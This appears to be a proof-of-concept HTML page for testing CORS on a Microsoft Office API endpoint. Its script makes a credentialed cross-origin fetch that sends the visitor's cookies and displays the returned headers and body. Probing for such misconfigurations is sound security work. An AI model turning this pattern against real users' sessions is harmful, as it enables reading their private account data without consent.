<!DOCTYPE html>
<html>
  <head>
    <title>CORS PoC</title>
  </head>
  <body>
    <h1>CORS PoC</h1>
    <button onclick="testCORS()">Test CORS</button>
    <pre id="output"></pre>

    <script>
      function testCORS() {
        fetch("https://webshell.suite.office.com/api/allapps/GetAllApps?culture=en-us", {
          method: "GET",
          credentials: "include" // Include cookies if needed
        })
        .then(response => {
          document.getElementById('output').textContent =
            `Status: ${response.status}\nHeaders: ${[...response.headers.entries()].map(([k,v]) => k + ': ' + v).join('\n')}`;
          return response.text();
        })
        .then(data => {
          document.getElementById('output').textContent += `\n\nBody:\n${data}`;
        })
        .catch(error => {
          document.getElementById('output').textContent = `CORS Error: ${error}`;
        });
      }
    </script>
  </body>
</html>
